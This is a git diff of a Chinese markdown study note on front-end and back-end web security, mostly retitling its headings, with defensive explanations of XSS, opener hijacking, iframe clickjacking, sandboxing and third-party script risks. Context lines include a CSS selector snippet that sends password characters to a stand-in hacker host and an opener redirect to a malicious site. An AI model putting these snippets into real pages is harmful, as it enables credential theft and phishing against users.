@@ -1,10 +1,10 @@
 
-## 安全问题
+# 安全问题
 
 > CSP的详细文档<https://cloud.tencent.com/developer/chapter/13541>
 
-#### WEB前端
-######  xss
+## WEB前端
+####  xss
 - 定义：
     - 反射性：代码不会储存。类似`https://www.weibo?t=${xss的代码}`的链接，当t的值被当做html片段插入文档中xss代码即被执行
     - 存储性：在提交表单数据时，xss代码被保存在数据库，下次在页面上直接输出该部分内容展示时被执行
@@ -85,7 +85,7 @@
                 - 这里的不同站点的判断并非直接使用的 同域、跨域的概念进行判断，而是使用 Public Suffix List 来判断,为了方便理解，暂时用同域的概率来对应Public Suffix List  判断。
         - 使用restful形式的接口?
 
-###### a标签跳转时 opener.location.href劫持
+#### a标签跳转时 opener.location.href劫持
 - 定义：当带有target="_blank"的a标签打开的新标签页面，在新标签页中可以通过`window.opener.location.href = 'https://www.hack.com'`能将原页面跳转到恶意页面
 - 解决办法：
     - 1.在 a 标签的 rel 属性中指定 rel="noopener",这种方法IE上基本不支持
@@ -96,7 +96,7 @@
     - 通过设置rel="noopener"，可以避免这种性能问题。
     - 原文：`Linking to another page using target="_blank" will run the new page on the same process as your page. If the new page is executing expensive JS, your page's performance may suffer. To avoid this use rel=noopener.`
 
-###### iframe 被恶意嵌套问题
+#### iframe 被恶意嵌套问题
 - 定义: 这定义就比较明确了，恶意站点www.hack.com 通过iframe嵌入你的站点www.hehe.com
 - 危害:
     - 仍然是点击劫持，恶意站点在iframe上覆盖一个透明的a标签，然后点击引导到恶意站点，用户认为是一个安全的站点跳转过来，因此很可能信任新的页面
@@ -126,7 +126,7 @@
 
 > 普通跨域的情况，iframe 是获取不到 `top.location.href`，但是可以设置`top.location.href`。
 
-###### iframe 沙箱
+#### iframe 沙箱
 
 - 定义：sandbox就是用来给指定iframe设置一个沙盒模型，限制iframe 嵌入页面的权限。（IE10才开始支持）。基本用法就是`<iframe sandbox="xx" src="xxx"></iframe>`
 - iframe sandbox几个值的情况
@@ -144,7 +144,7 @@
     - allow-popups:允许iframe中弹出新窗口,比如,window.open,target="_blank"
     - allow-pointer-lock:在iframe中可以锁定鼠标，主要和鼠标锁定有关（没太懂这个含义）
 
-###### 第三方资源js本身存在安全问题
+#### 第三方资源js本身存在安全问题
 - 定义：
     - 通过cdn加载的第三方js存在 问题代码
     - 通过npm 安装的js组件存在问题代码，或者组件后续升级时，加入了问题代码，基本上作者的npm 或 github账号被盗后，就容易出现这种问题
@@ -156,7 +156,7 @@
     - 2.不要通过cdn的方式挂在第三方资源，建议保存在本地项目中在进行挂载
     - 3.对于需要npm install 安装的第三方库，应该明确指定版本或者通过`package-lock.json`锁定一个具体的版本
 
-###### 第三方css偷取密码问题
+#### 第三方css偷取密码问题
 
 > [这篇文章](http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/)讲的相当详细了
 
@@ -192,12 +192,12 @@ input[type="password"][value$="6"] { background-image: url("http://www.hacker.co
 /*后面省略value$="各种字符"的css*/
 ```
 
-- 拖拽劫持
-- 302跳转劫持问题
+#### 302跳转劫持问题
+
 - cdn劫持
 - 可执行文件上传漏洞
 
-###### http明文传输本身存在问题
+#### http明文传输本身存在问题
 
 **到底如何不安全了？**
 
@@ -219,13 +219,13 @@ input[type="password"][value$="6"] { background-image: url("http://www.hacker.co
             - `<object>`
 
 
-###### web前端针对 法律法规存在的文案问题
+#### web前端针对 法律法规存在的文案问题
 这个不用多说，如果对广告法缺乏基本的认知，很可能出现法律安全方面的问题，比如国家目前是禁止`第一、最大、最全`这类的广告宣传；其次就是当地政策的不了解导致的安全问题，比如将 TW，HK归为国家类，这都是严重错误的情况。技术上无法完全规避这类文案问题，只能不断加强 文案安全合规的的意识。
 
 - 公开的信息被恶意批量爬取，比如有效资源，联系电话：见https://www.dianping.com/shop/57504830
 
 
-#### 后端
+## 后端
 
 - SQL 注入： sqlmap，中国菜刀
 - DDos攻击
